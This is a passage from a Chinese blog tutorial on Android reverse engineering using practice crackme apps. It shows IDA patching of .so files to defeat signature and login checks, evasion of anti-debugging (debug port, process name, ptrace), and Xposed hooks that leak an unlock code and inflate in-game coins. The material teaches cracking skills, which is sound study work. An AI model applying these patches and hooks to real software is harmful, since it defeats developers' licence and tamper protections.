%}\n\n那我们用IDA(这里用IDAv6.6，因为IDAv7.0没有`modifyfile`插件)打开`x86`目录下的so文件，Shift + F12打开字符串窗口，Ctrl + F 查找“52pojie”，双击进入找到其内存地址。\n\n{% asset_img 内存地址.png 52pojie内存地址 %}\n\n选中字符串，按照下图操作去到十六进制视图。\n\n{% asset_img hexodump.jpg hex dump %}\n\n将我们想写入的内容转换为十六进制。\n\n{% asset_img 16进制转换.png 转换为16进制 %}\n\n```asm\n68 65 6c 6c 6f 20 76 35 6c 65 30 6e 39\n```\n\n回到IDA，选中需要修改的首字节右键->Edit。\n\n{% asset_img 16进制编辑.png 编辑字符串 %}\n\n修改好，再次右键->Apply changes。\n\nEdit -> Plugins -> modifyfile -> 确认更改。另存到某处。\n\n{% asset_img modifyfile.jpg modifyfile %}\n\n如果lib目录中有多种模式，如果修改32位`.so`则把所有32位处理器目录下的`.so`都更换为新的`.so`文件，64位同理。我们只修改的是32位的，所以只要在`x86`目录下替换即可。\n\n重新打包并签名。安装在模拟器上，运行。\n\n{% asset_img so.png 修改so文件成功 %}\n\n# 8. IDA爆破签名验证(IDA静态分析)\n\n我发现会飞的丑小鸭特别油麦，下面是他为了引出主题写的一个场景，我觉得特别逗就拿过来给你们看看。\n\n> 李华是一个很有天赋 的Android程序员 他用了半年时间含辛茹苦，挑灯夜战，摧枯拉朽的编写了一款黑宝宝游戏。当然这几个词形容的并不恰当，但是李华确实为了这个apk的上线付出了很多努力。谁知游戏刚一上线就被破解了，生不生气？难不难过？\n>\n> 吸取了这次的教训，李华决定要反击。他通过书籍了解到一个apk只有一个签名，于是他有了一个很大胆的想法：如果别人要破解我的apk，他一定会对我的apk进行重打包，但是重打包后的签名就不是我原来的签名了，我可以在代码中判断，如果签名不是我的签名，那么就让程序退出。这样不就达到防止别人破解的目的了，哈哈哈，太佩服我自己了。\n>\n> 他知道你最近在学习Android逆向，他想在游戏上线前让你测试一下他新加的签名验证是否能防住别人的破解。\n> 下面是李华编写的黑宝宝apk\n> 链接：https://pan.baidu.com/s/1h6pX2ARE3qtiKiYbcnJ-3g 密码：duv5\n>\n> 你拿到这个apk直接反编译重打包后安装到手机上，刚一运行程序就退出，你懵了，明明我什么都没改！接着看了一会反编译后的代码说：他的签名验证是写在so里面的，但是我不会so的破解，大哥你教教我吧！\n>\n> 我说：好吧！\n>\n> 下面开始本节课的课程，请同学们认真听课。\n\n用apktool解包apk后将项目载入AS，在`myJNI.smali`里有`check`函数，应该就是验证签名是否一致的函数。\n\n{% asset_img check.png check函数 %}\n\n将`libJniTest.so`载入IDA，需要注意的是，IDA众多窗口中，有两个窗口与so有关：Exports窗口是导出表，能让外部调用so中的函数；Imports窗口是导入表，能让so调用外部的函数。所以根据上面的信息，so里有check函数，所以check可以被外部调用，应该在导出表里找check函数。\n\n{% asset_img exports.png 导出表 %}\n\n双击进去到汇编代码，F5进入反汇编代码。谁能想到`armeabi`目录下的`.so`文件需要IDA32才能反编译呢，果断把文件载入IDA32。\n\n以下两种情况是根据不同版本的IDA对so文件修改的处理。\n\n## IDAv7.0+\n\n去到反汇编代码后，看到很多字符串，暂时我们还不知道有什么用，但我们熟悉Log，下面这三条应该是输出Log语句。\n\n{% asset_img print.png 导出表 %}\n\n先进去`unk_223C`看看里面是什么。好吧，就算16进制转文本也翻译不出来。\n\n```asm\n4A 4E 49 E8 8E B7 E5 8F 96 E5 88 B0 E7 9A 84 E7 AD BE E5 \nJ  N  I\n90 8D E6 98 AF 25 73\n\t\t\t    %  s\n```\n\n那就在模拟器运行一下用AS获取Log吧。\n\n{% asset_img 获取签名.png 出现Log %}\n\n再拿去16进制转文本，这跟上面的16进制代码有半毛钱关系吗？！这里我真不知道怎么回事，哪位大牛来告诉我。\n\n{% asset_img 16进制转文本.png 16进制转文本 %}\n\n已知那一大串数字是签名，如果v9与字符串一致，则跳到`unk_261A`显示“签名一致”，那`unk_262E`自然就是“签名不一致”，退出程序。我们破解的思路是，就算v9与字符串不一致，也要让它跳到`unk_261A`去。\n\n回到汇编视图，在左侧的函数窗口找到`check`函数双击来到图形化窗口，找到关键跳转。\n\n{% asset_img 汇编.png 关键跳转 %}\n\nBNE：数据跳转指令，标志寄存器中Z标志位不等于零时, 跳转到BNE后标签处。\nBEQ：数据跳转指令，标志寄存器中Z标志位等于零时, 跳转到BEQ后标签处。\n\n所以我们把`BNE`修改为`BEQ`即可。`BNE`的机器码为`D1`，`BEQ`的机器码为`D0`。按照下图操作修改机器码。\n\n{% asset_img 修改字节.jpg 修改字节 %}\n\n修改完后保存so文件。\n\n{% asset_img 保存so文件.jpg 保存so文件 %}\n\n{% asset_img bak.png 保存备份 %}\n\n把`armeabi`和`armeabi-v7a`下的`libJniTest.so`替换成修改后的so，再删掉`x86`目录。打包签名。\n\n这里为什么要删掉`x86`目录，可能是因为雷电模拟器是x86架构的，它默认使用`x86`目录下的`libJniTest.so`，所以删掉才有可能使用`armeabi`或`armeabi-v7a`目录下的`libJniTest.so`。\n\n## IDAv6.6\n\n去到反汇编代码后，看到一条很长的字符串，暂时我们还不知道有什么用，但我们熟悉Log，下面这三条应该是输出Log语句。\n\n{% asset_img 字符串.png Log语句 %}\n\n由于中文乱码，所以设置编码为UTF-8，Options ->  ASCII string style -> Set default encodings -> 8-bit... -> Change -> UTF-8 -> OK。\n\n{% asset_img string.png 设置编码 %}\n\nF5重新反编译一下，乱码问题解决。\n\n{% asset_img 解决乱码.png 解决编码 %}\n\n分析一下程序流程，`getSignature`是获取程序签名，获取的签名与那一长串比较，如果相等则“签名一致”。破解的思路是即使获取的签名与存储的签名不一致，也可以让程序跳到“签名一致”处，本质就是修改跳转指令。\n\n回到汇编视图，在左侧的函数窗口找到`check`函数双击，按空格来到图形化窗口，找到关键跳转。\n\n{% asset_img 跳转.png 关键跳转 %}\n\nBNE：数据跳转指令，标志寄存器中Z标志位不等于零时, 跳转到BNE后标签处。\nBEQ：数据跳转指令，标志寄存器中Z标志位等于零时, 跳转到BEQ后标签处。\n\n所以我们把`BNE`修改为`BEQ`即可。`BNE`的机器码为`D1`，`BEQ`的机器码为`D0`。老方法，去到hex dump处修改十六进制代码。保存so文件，删掉`x86`目录，打包签名。\n\n# 9. IDA动态破解登录验证\n\n## 9.1 预备知识与环境配置\n\njeb工具的使用 https://www.52pojie.cn/thread-742250-1-1.html\n\n我觉得jeb就是AK+AS，可以看看，如果熟悉AK和AS，jeb很容易上手。jeb的优点是反编译回Java的可读性比AK强。\n\nAndroid逆向必会命令 https://www.52pojie.cn/thread-742284-1-1.html\n\n连手机和连模拟器是一模一样的命令，不需要担心。\n\nso文件如果是arm架构的，用x86架构的雷电模拟器可能会出问题，所以最好用真机或安卓原生模拟器或Genymotion调试。真机需要root权限，否则IDA在附加上程序时出现不了包名。但小米手机不是默认root，搞个root权限要花很长时间。原生模拟器也太卡了...但卡归卡，调试时还是很友好的。Genymotion会出现各种各样的问题，我佛了。\n\nGenymotion安装及ARM支持 https://blog.csdn.net/fidelhl/article/details/85239238 \n\nGenymotion-ARM-Translation  https://www.jianshu.com/p/97b8250f359e \n\nadb devices检测不到genymotion模拟器 https://blog.csdn.net/qq_15158911/article/details/75304011 \n\n关闭端口：\n\n```\nC:\\Users\\dell>netstat -ano | findstr 23946\n  TCP    127.0.0.1:23946        0.0.0.0:0              LISTENING       13752\n\nC:\\Users\\dell>taskkill -pid 13752 -f\n成功: 已终止 PID 为 13752 的进程。\n```\n\n## 9.2 动态破解登录验证\n\n拿到一个`.apk`程序，先在模拟器上安装，运行一下熟悉流程。程序与第8节的几乎一样，但第8节的程序没有`android:debuggable=\"true\"`。\n\n将`.apk`文件用AK打开，因为需要调试，所以必须保证`application`标签里的` android:debuggable=\"true\"`。\n\n{% asset_img debug.png android:debuggable=\"true\" %}\n\n找到MainActivity入口类，并反编译成java代码。通过静态分析java代码可知，用户在输入用户名和密码后程序会调用Native方法check。\n\n{% asset_img 13.png MainActivity %}\n\n{% asset_img 14.png jni %}\n\n解包将`libJniTest.so`载入IDA分析check方法的具体实现。这个程序有3个lib，具体分析哪个`libJniTest.so`，看模拟器或真机默认使用哪个so。Genymotion虽然安装了arm架构，但如果有`x86`的so文件它还是使用`x86`目录下的。真机是arm架构的，用`armeabi-v7a`或`armeabi`都没问题，但修改完后要把两个目录下的so文件都替换成新的。\n\n将x86目录下的so文件载入IDA，几乎与armeabi目录下的差不多，但汇编代码是我们熟悉的PC逆向，感觉来了！\n\n{% asset_img 9.2.8.png IDA反编译 %}\n\n{% asset_img 9.2.9.png 汇编代码 %}\n\n开始动态调试。将`IDA_Pro_7.5\\dbgsrv`目录下的`android_x86_server` push 到模拟器`/data/local/tmp/`目录下，给777权限并运行`android_x86_server`。注意，真机 push `android_server`。\n\n```\nC:\\Users\\dell>adb push D:\\CTF\\tools\\IDA_Pro_v7.5\\dbgsrv\\android_x86_server /data/local/tmp\nD:\\CTF\\tools\\IDA_Pro_v7.5\\dbgsrv\\android_x86_server: 1 file pushed, 0 skipped. 693.5 MB/s (1130104 bytes in 0.002s)\n\nC:\\Users\\dell>adb shell\nvbox86p:/ # cd /data/local/tmp\nvbox86p:/data/local/tmp # ls -al\ntotal 1900\ndrwxrwx--x 2 shell shell    4096 2022-03-08 19:53 .\ndrwxr-x--x 3 root  root     4096 2022-03-07 00:13 ..\n-rwxrwxrwx 1 root  root   786868 2020-12-31 11:00 android_server\n-rw-rw-rw- 1 root  root  1130104 2020-12-31 11:00 android_x86_server\nvbox86p:/data/local/tmp # chmod 777 android_x86_server\nvbox86p:/data/local/tmp # ./android_x86_server\nIDA Android x86 32-bit remote debug server(ST) v7.5.26. Hex-Rays (c) 2004-2020\nListening on 0.0.0.0:23946...\n```\n\n新开一个cmd，执行端口转发命令：\n\n```\nC:\\Users\\dell>adb forward tcp:23946 tcp:23946\n23946\n```\n\n模拟器运行该程序，回到刚才打开的IDA，确保已经载入主机该程序的so文件，且与模拟器使用的so文件一致。Debugger -> Select debugger 。选择Linux debugger。\n\n{% asset_img 9.2.10.png Linux debugger %}\n\nDebugger -> Process options ，确认端口号。\n\n{% asset_img 9.2.11.png Linux 确认端口号 %}\n\nDebugger -> Attach to process ，找到我们需要附加的包名。\n\n{% asset_img 9.2.12.png Linux 附加包名 %}\n\n确认so文件是否一致。\n\n{% asset_img 9.2.13.png so文件一致 %}\n\n等它加载，在某个地方停下来，此时，EIP指向停止处。\n\n{% asset_img 9.2.14.png 载入界面 %}\n\nCtrl + S找so文件，找到有执行权限且最开始的so文件。\n\n{% asset_img 9.2.15.png 有执行权限的so文件 %}\n\n或在Modules窗口找so文件，在so文件里找check方法。\n\n{% asset_img 9.2.16.png 汇编代码 %}\n\n也可以F5查看伪代码，根据伪代码在汇编代码中找到几个跳转语句下断。\n\n{% asset_img 9.2.17.png 下断 %}\n\nF9运行程序，输入用户名555和密码3333，点击登录，IDA停在第一个断点处。因为我们没有重新编译签名，所以签名是一致的，不跳转，继续往下执行。\n\n{% asset_img 9.2.18.png 第一个断点处 %}\n\nF8往下执行或F9来到下个断点处，可以看到寄存器窗口ESI指向我们输入的用户名，EDI指向真正的用户名，将两个进行对比，由于不一致，所以跳转实现。第三个断点一样，不再赘述。\n\n{% asset_img 9.2.19.png 第二个断点处 %}\n\n接下来修改，因为我们修改完so文件，要重新编译打包签名，所以签名校验一定要绕过，用户名和密码也要爆破，所以总共要修改三处跳转。\n\n`jz`的机器码为74，`jnz`的机器码为75。选中要修改的字节，Edit -> Patch program -> Change Byte 。\n\n{% asset_img 9.2.20.png 修改程序 %}\n\nEdit -> Patch program -> Apply patches to input file ，保存so文件。重打包，在AK中签名。模拟器安装程序，验证，登录成功。\n\n{% asset_img 9.2.21.png 运行成功 %}\n\n注意，我们只修改了x86目录下的so文件，如果想要程序在所有架构都能“登录成功”，必须要修改它所有拥有的so文件。\n\n# 10. 动态调试反调试apk\n\n## 10.1 反调试及反反调试\n\n### 10.1.1 IDA调试端口检测\n\n原理：调试器远程调试时，会占用一些固定的端口号，如23946。\n\n解决方法：修改调试端口号。端口号范围从0到65535，0不使用，1到1023为BSD保留端口，也是系统端口，1024到5000是BSD临时端口，5001到65535为用户自定义端口。\n\n```\n./android_server -p6666\n```\n\n### 10.1.2 调试器进程名检测\n\n原理：远程调试要在手机中运行`android_server`、`gdbserver`、`gdb`等进程。\n\n解决方法：修改调试器server名字。\n\n```\nrename android_server heiboy\n```\n\n### 10.1.3 ptrace检测\n\n原理：一个进程只能被ptrace一次，可以自己ptrace自己，如果被调试器ptrace了，自己ptrace肯定ptrace不了，根据返回值进行判断。\n\n解决方法：\n\n1. 修改系统源码，让ptrace返回值恒为0\n2. hook ptrace\n\n## 10.2 反反调试apk\n\n拿到一个`.apk`程序，先在AS原生模拟器上安装，运行一下熟悉流程。如果只有arm架构so文件的最好用AS原生模拟器，因为genymotion即使支持arm架构还是调试不了。\n\n```\nadb install AliCrackme_2_killer.apk\n```\n\n{% asset_img 9.2.1.png 运行程序 %}\n\n将`.apk`文件用AK打开，因为需要调试，所以必须保证`application`标签里有` android:debuggable=\"true\"`。如果没有必须加上，重新编译打包，卸载模拟器里的程序，重新安装。\n\n{% asset_img 10.1.png android:debuggable=\"true\" %}\n\n找到MainActivity入口类，并反编译成java代码。通过静态分析java代码可知，程序调用了Native方法`securityCheck`，且放在了`libcrackme.so`文件中。\n\n{% asset_img jni.png MainActivityjava代码 %}\n\n解包发现只有`armeabi`目录的`libcrackme.so`，载入IDA分析`securityCheck`方法的具体实现，伪代码和汇编代码配合使用。\n\n{% asset_img 10.2.png 汇编代码 %}\n\n{% asset_img 9.2.2.png 伪代码分析 %}\n\n盲猜 v5 == v3，但很遗憾，失败了，所以v3一定是经过某种转换才等于“wojiushidaan”。选中v5后面的v3右键->Set Ivar Type，通过`JNIEnv*`还原类似((_DWORD )v3 + 676))格式的指令。\n\n{% asset_img 9.2.3.png JNIEnv* %}\n\n{% asset_img 9.2.4.png GetStringUTFChars %}\n\n要想知道怎么变换，需要动态调试`libcrackme.so`文件。\n\n打开cmd，将`IDA_Pro_v7.5\\dbgsrv`目录下的`android_server` push 到模拟器`/data/local/tmp/`目录下，给777权限并运行`android_server`。\n\n```\nC:\\Users\\dell>adb push D:\\CTF\\tools\\IDA_Pro_v7.5\\dbgsrv\\android_server /data/local/tmp\nD:\\CTF\\tools\\IDA_Pro_v7.5\\dbgsrv\\android_server: 1 file pushed, 0 skipped. 494.3 MB/s (589588 bytes in 0.001s)\n\nC:\\Users\\dell>adb shell\nvbox86p:/ # cd /data/local/tmp\nvbox86p:/data/local/tmp # ls -al\ntotal 596\ndrwxrwx--x 2 shell shell   4096 2022-03-07 09:01 .\ndrwxr-x--x 3 root  root    4096 2022-03-07 00:13 ..\n-rw-rw-rw- 1 root  root  589588 2017-09-14 03:08 android_server\nvbox86p:/data/local/tmp # chmod 777 android_server\nvbox86p:/data/local/tmp # ./android_server\nIDA Android 32-bit remote debug server(ST) v1.22. Hex-Rays (c) 2004-2017\nListening on 0.0.0.0:23946...\n```\n\n新开一个cmd，执行端口转发命令：\n\n```\nC:\\Users\\dell>adb forward tcp:23946 tcp:23946\n23946\n```\n\n按照第9节的照做一遍，PC指向程序停止处。 Ctrl + S 找到有执行权限的`libcrackme.so`，在Modules窗口找到的`securityCheck`函数的图形化界面竟然没有显示“wojiushidaan”，而是“aiyou,bucuoo”。\n\n{% asset_img 10.3.png 汇编代码 %}\n\n回到汇编代码再函数起始处下断，F9运行，程序直接退出。说明程序有反调试功能。\n\n{% asset_img 10.7.png 下断点 %}\n\n先不管那么多，输入“aiyou,bucuoo”试试，成功了！\n\n{% asset_img 10.4.png 输入校验码 %}\n\n好啦好啦你肯定又跟我说我学的是破解！回归正题，反调试的基本原理是这样的：IDA使用android_server在root环境下注入到被调试的进程中，用到的技术是Linux中的ptrace，当Android中的一个进程被另外一个进程ptrace之后，在其status文件中有一个字段TracerPid可以标识是被哪一个进程trace了(Linux中的/proc/pid/status文件)。这里有两个地方是so动态加载完毕前执行的，`.init_array`是一个so最先加载的一个段信息，时机最早，现在一般so解密操作都是在这里做的；`JNI_OnLoad`是so被System.loadLibrary调用的时候执行的，它的时机早于native方法的执行。\n\n反调试机制很可能在`JNI_Onload`处就让程序退出的，所以我们得先去掉反调试机制，才能继续进行破解。那如何断在`JNI_OnLoad`函数指令处呢？Debugger -> Debugger options -> 勾选下面三个选项。\n\n{% asset_img 三选项.png 三个选项 %}\n\n这三个选项意味着：\n\n- 第一个：在APK程序入口处停止。\n- 第二个：有线程启动运行或者退出时，暂停。\n- 第三个：当动态库（apk中的so文件）加载或者取消加载时，暂停。\n\n但是由于被调试程序一运行就会执行static中的语句，因此需要让程序停在加载so文件之前，故可以使用debug方式来启动：\n\n```\nC:\\Users\\dell>adb shell am start -D -n com.yaotong.crackme/.MainActivity\nStarting: Intent { cmp=com.yaotong.crackme/.MainActivity }\n```\n\n在载入so文件的IDA下点击 Debugger -> Attach to process ，找到我们需要附加的包名。等它加载到PC停止。\n\n此时，so文件还没有被加载到内存中去，所以还要让程序跑起来。启动 DDMS（进入sdk安装目录`\\sdk\\tools`下，运行` monitor.bat `脚本启动），在DDMS上选择相应进程后，使用指令使apk继续运行，成功后，DDMS上进程将显示绿色，否则是红色。\n\n{% asset_img DDMS.png 在DDMS上选择相应进程 %}\n\n```\nC:\\Users\\dell>jdb -connect com.sun.jdi.SocketAttach:port=8700,hostname=localhost\n设置未捕获的java.lang.Throwable\n设置延迟的未捕获的java.lang.Throwable\n正在初始化jdb...\n>\n```\n\n{% asset_img DDMS2.png 显示绿色 %}\n\n如果在DDMS中找不到相应进程，点一下重置adb，再选中目标进程，输入命令。\n\n{% asset_img reset.jpg 重置adb %}\n\n点击运行几次，直至弹窗。\n\n{% asset_img 10.6.png 弹窗 %}\n\nCtrl + S 看到有执行权限的`libcrackme.so`文件，在Modulus窗口找到`libcrackme.so`中的`JNI_Oload`函数，在函数起始处下断，F9运行。\n\n{% asset_img 10.6.jpg 下断运行 %}\n\n然后F8步过，来到此位置。经多次调试，运行到`BLX R7`时会跳到另一段代码处。这段代码的用途是创建线程。\n\n{% asset_img 10.8.jpg 创建线程 %}\n\n为什么要在`JNI_Oload`里创建线程呢？很有可能是ptrace检测。` thread_create`函数在`init_array`段里，这个函数创建了一个线程循环来读取`/proc/pid/status`文件下的TracePid的值，如果大于0说明程序正在被调试，退出程序。直接nop掉这行代码试试。arm的`ANDEQ R0`对应x86的`nop`，机器码为`00 00`。\n\n{% asset_img 10.9.png nop掉创建线程 %}\n\n保存，重打包，签名。现在用第9节的方法再试一遍，看是否能在`libcrackme.so`中的`securityCheck`方法中断下来。先下断点，再在app中输入密码，点击按钮，IDA成功停在断点处。\n\n{% asset_img 10.10.png 停在断点处 %}\n\n接下来如何破解？F8步过，运行到此处，查看R0寄存器，存的是输入的“555”。\n\n{% asset_img 10.11.png R0寄存器 %}\n\n{% asset_img 10.12.png 代码分析 %}\n\n如果要使输入任何都成功，则需要修改循环里的两个跳转语句。呃不知道为什么这里BNE的机器码不是`D1`，所以只能全都改为nop语句也是可以的。\n\n{% asset_img 10.13.png BNE %}\n\n{% asset_img 10.14.png nop %}\n\n卸载模拟器中旧的app：\n\n```\nadb uninstall com.yaotong.crackme\n```\n\n安装新的，运行。无论输入什么都会跳转到成功页面。\n\n{% asset_img 10.15.png 成功 %}\n\n# 11. 编写Xposed模块\n\nXpose是一款特殊的安卓应用，诞生于著名的XDA论坛，它的原理是替换安卓系统`/system/bin`目录下的app_process来控制zygote进程，使得app_pross在启动时会加载`XposedBridge.jar`，从而实现对zygode进程以及其创建的虚拟机的劫持，最终对系统的某些功能实现接管。\n\n优点：Xpose可以在我们不破坏apk自身的情况下实现对函数的hook，修改函数的参数和返回值，改变函数的结构并执行我们自己的代码，用好了Xposed可以对我们的逆向过程起到事半功倍的作用。\n\n缺点：本身不能对so中的函数进行修改，需要结合其他框架。 \n\n在模拟器上安装Xposed框架 https://blog.csdn.net/weixin_48140105/article/details/118359568 \n\n编写一个Xposed模块，也就是开发一个安卓app。和普通程序本质上是一样的，不一样的点在于：\n\n- 让EdXposed知道我们安装的这个程序是个Xposed模块。\n- 模块里要包含有Xposed的API的jar包，以实现下一步的hook操作。\n- 这个模块里面要有对目标程序进行hook操作的方法。\n- 要让手机上的Xposed框架知道，我们编写的Xposed模块中，哪一个方法是实现hook操作的，也就是hook类的入口。\n\n先在AS中创建一个Empty Activity项目，在界面创建一个按钮，实现某种功能。\n\n{% asset_img 11.8.png 增加按钮 %}\n\n在`MainActivity.java`中编写实现按钮功能代码。\n\n```java\npackage com.example.xposemk;\n\nimport androidx.appcompat.app.AppCompatActivity;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.widget.Button;\nimport android.widget.Toast;\n\npublic class MainActivity extends AppCompatActivity {\n    private Button mBtn;\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n        mBtn = (Button) findViewById(R.id.btn);\n        mBtn.setOnClickListener(new View.OnClickListener(){\n            @Override\n            public void onClick(View v){\n                Toast.makeText(MainActivity.this, message(), Toast.LENGTH_SHORT).show();\n            }\n        });\n    }\n    public String message() {\n        return \"红红火火恍恍惚惚\";\n    }\n}\n```\n\n连接好模拟器，安装app运行。\n\n{% asset_img 11.9.png 正常运行 %}\n\n现在通过编写一个Xposed模块修改按钮被点击后显示的弹框信息。\n\n下载XposedBridgeAPI模块 https://github.com/924587628/XposedBridgeAPI ，将下载的API拖进libs文件夹。\n\n{% asset_img 11.2.png 拖进libs文件夹 %}\n\n右击jar包 -> Add As Library -> OK。\n\napp -> src -> main -> AndroidManifest.xml ，在`application`标签中加入Xpose配置信息。\n\n```\n<meta-data\n        android:name=\"xposedmodule\"\n        android:value=\"true\" />\n<meta-data\n        android:name=\"xposeddescription\"\n        android:value=\"Easy example\" />\n<meta-data\n        android:name=\"xposedminversion\"\n        android:value=\"89\" />\n```\n\n{% asset_img 11.3.png Xposed %}\n\napp -> build.gradle，在dependencies段里修改。\n\n```\ndependencies {\n    ...\n    compileOnly files('libs\\\\XposedBridgeAPI-89.jar')\n}\n```\n\n{% asset_img 11.4.png compileOnly %}\n\n在`MainActivity.java`同目录里新建一个`hook.java`，代码如下：\n\n```java\npackage com.example.xposemk;\nimport de.robv.android.xposed.IXposedHookLoadPackage;\nimport de.robv.android.xposed.XC_MethodHook;\nimport de.robv.android.xposed.XposedBridge;\nimport de.robv.android.xposed.XposedHelpers;\nimport de.robv.android.xposed.callbacks.XC_LoadPackage;\n\npublic class hook implements IXposedHookLoadPackage{\n    @Override\n    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable{\n        if(loadPackageParam.packageName.equals(\"com.example.xposemk\")){\n            XposedBridge.log(\"hooking...\");\n            Class cls = loadPackageParam.classLoader.loadClass(\"com.example.xposemk.MainActivity\");\n            XposedHelpers.findAndHookMethod(cls, \"message\", new XC_MethodHook(){\n                @Override\n                protected void beforeHookedMethod(MethodHookParam param) throws Throwable{\n                    super.beforeHookedMethod(param);\n                }\n                @Override\n                protected void afterHookedMethod(MethodHookParam param) throws Throwable{\n                    Object obj = param.getResult();\n                    XposedBridge.log(obj.toString());\n                    param.setResult(\"biubiubiu\");\n                }\n            });\n        }\n    }\n}\n```\n\n右击main，New -> Folder -> Assets Folder。main -> assets 右键 -> New -> file ，新建`xposed_init`文件，将内容编辑为包名+类名。\n\n{% asset_img 11.6.png Xposed_init文件 %}\n\n{% asset_img 11.7.png 包名+类名 %}\n\n模拟器卸载原本的app，重新安装。打开Xposed Installer，在模块栏勾选对应进程。\n\n{% asset_img 11.11.png Xposed Installer勾选对应进程 %}\n\n重启模拟器，运行app，发现显示的弹框信息已被修改。\n\n{% asset_img 11.10.png 弹框信息已被修改 %}\n\n# 12. Xpose实战\n\nhook一个函数需要知道以下三点：\n(1)方法的包名+类名\n(2)方法名\n(3)方法的参数类型 \n\n{% asset_img 12.1.png 解锁失败 %}\n\n用jeb打开apk，查看`MainActivity`反编译的源码。\n\n{% asset_img 12.2.png 查看源码 %}\n\n发现有好多a，这里应该是做了简单混淆。那就一个个来看吧。\n\n{% asset_img 12.3.png 简单混淆 %}\n\n`com.hfdcxy.android.by.a`包中有一个类a，其中有一个方法a和一个属性a。`a.a.a`的作用是输出Log语句。\n\n```java\npackage com.hfdcxy.android.by.a;\nimport android.util.Log;\npublic class a {//类a\n    private static boolean a;//属性a\n\n    static {\n        a.a = false;//属性a一开始为false\n    }\n\n    public static void a(String arg1) {//方法a\n        if(a.a) {//如果属性a为true，输出Log\n            Log.i(\"Tiger_test\", arg1);\n        }\n    }\n}\n```\n\n`com.hfdcxy.android.by.test`包中有一个类a，其中有一个方法a。`test.a.a`的作用是MD5加密。\n\n```java\npackage com.hfdcxy.android.by.test;\nimport java.security.MessageDigest;\npublic class a {//类a\n    public static String a(String arg6) {//方法a\n        MessageDigest v2;\n        int v1 = 0;\n        try {\n            v2 = MessageDigest.getInstance(\"MD5\");\n        }\n        catch(Exception v0) {\n            System.out.println(v0.toString());\n            v0.printStackTrace();\n            String v0_1 = \"\";\n            return v0_1;\n        }\n\n        char[] v3 = arg6.toCharArray();\n        byte[] v4 = new byte[v3.length];\n        int v0_2;\n        for(v0_2 = 0; v0_2 < v3.length; ++v0_2) {\n            v4[v0_2] = ((byte)v3[v0_2]);\n        }\n\n        byte[] v0_3 = v2.digest(v4);\n        StringBuffer v2_1 = new StringBuffer();\n        while(v1 < v0_3.length) {\n            int v3_1 = v0_3[v1] & 255;\n            if(v3_1 < 16) {\n                v2_1.append(\"0\");\n            }\n\n            v2_1.append(Integer.toHexString(v3_1));\n            ++v1;\n        }\n\n        return v2_1.toString();\n    }\n}\n```\n\n因为解锁成功与否的过程没用到`b.a`，暂时先不分析它。\n\n重新看这条关键代码，它的意思是v0等于当前手机的`android_id`经过MD5加密后与固定字符串`hfdcxy1011`进行拼接后再进行一次MD5加密得到的值截取前6位。\n\n```java\nString v0 = a.a(a.a(Settings$System.getString(this.a.getContentResolver(), \"android_id\")) + \"hfdcxy1011\").substring(0, 6);\n```\n\n这里有三种方式可以把这个解锁码打印出来：\n\n(1)我们知道`test.a.a`方法是最后一层加密，我们可以hook这个a方法把它的返回值打印出来，然后取其前6位为解锁码；\n\n(2)因为整个apk只有一处对`substring`的调用，我们可以hook系统函数`substring`把函数返回值打印出来；\n\n(3)通过分析知道`a.a.a`方法为log打印的方法，我们可以hook这个a方法的参数，把解锁码通过Log打印出来。\n\n这里取第一种。\n\n方法的包名+类名：com.hfdcxy.android.by.test.a\n方法名：a\n方法的参数类型：String\n\n过滤下包名防止Xposed找不到包名对应的类报错，这里的包名是`manifest`标签下的包名`com.ss.android.ugc.aweme`。\n\n{% asset_img 12.4.png 包名 %}\n\n在第11节程序里面的hook类编写hook代码。就是模板，往里塞参数就行。\n\n{% asset_img 12.5.png hook代码 %}\n\n连上模拟器，安装app，Xposed Installer勾选相应程序模块，重启模拟器。运行`解锁程序.apk`，随意输入解锁码，点击解锁。回到AS搜索Log。\n\n{% asset_img 12.6.png Logcat %}\n\n因为`test.a.a`共调用了两次，第一次`MD5(android_id)`，第二次`MD5(MD5(android_id)+hfdcxy1011)`，取最后一次的前6位才是解锁码116f58。\n\n输入解锁码，进入充值页面。\n\n{% asset_img 12.7.png 解锁成功 %}\n\n点几下充值金币，再点开启宝箱，发现金币不足。回jeb继续分析代码。我们已经进入“解锁成功”的代码里去，看到里面调用了`DrawActivity`类。\n\n{% asset_img 12.8.png DrawActivity %}\n\n进去看看。\n\n{% asset_img 12.9.png DrawActivity %}\n\n也就是需要点击9999次才能开启宝箱，达咩！我们的思路是直接hook第一个按钮，修改`test.b.a`方法，使按一次就有10000金币。\n\n```java\npackage com.hfdcxy.android.by.test;\nimport android.content.SharedPreferences$Editor;\nimport android.content.SharedPreferences;\nimport android.widget.TextView;\npublic class b {//类b\n    public b() {\n        super();\n    }\n\n    public void a(SharedPreferences arg5, TextView arg6, int arg7) {//方法a，arg7是点击一次增加的金币数\n        SharedPreferences$Editor v0 = arg5.edit();\n        v0.putInt(\"coin\", arg5.getInt(\"coin\", 0) + arg7);\n        v0.commit();\n        arg6.setText(String.valueOf(arg5.getInt(\"coin\", 0)));\n    }\n}\n```\n\n方法的包名+类名：com.hfdcxy.android.by.test.b\n方法名：a\n方法的参数类型：SharedPreferences、TextView、int\n\n编写hook代码：\n\n{% asset_img 12.10.png hook代码 %}\n\n同样操作走一次，开启宝箱。\n\n{% asset_img 12.12.png 开启宝箱 %}\n\n{% asset_img 12.11.png 开启宝箱 %}\n\n我们可以尝试一下获取解锁码的第二第三种方法。\n\n第二种：`substring`是一个Java系统内部的方法，百度搜一下它的构造方法。\n\n```java\npublic String substring(int beginIndex)\n\n或\n\npublic String substring(int beginIndex, int endIndex)\n```\n\n方法的包名+类名：java.lang.String\n方法名：substring\n方法的参数类型：int、int\n\n编写Xpose代码：\n\n{% asset_img 12.14.png xpose代码 %}\n\n{% asset_img 12.13.png 解锁码 %}\n\n哈哈哈好像不止一个，但很容易知道哪个是解锁码，但是下面这样写是不行。\n\n方法的包名+类名：com.hfdcxy.android.by.test.a.a\n方法名：substring\n方法的参数类型：int、int\n\n第三种：通过`a.a.a`方法打印Log。因为v0是解锁码的前6位，刚好下一行就是Log输出v0的代码。\n\n```java\nString v0 = a.a(a.a(Settings$System.getString(this.a.getContentResolver(), \"android_id\")) + \"hfdcxy1011\").substring(0, 6);\ncom.hfdcxy.android.by.a.a.a(\"解锁码\" + v0);\n```\n\n方法的包名+类名：com.hfdcxy.android.by.a.a\n方法名：a\n方法的参数类型：String\n\n{% asset_img 12.15.png 解锁码 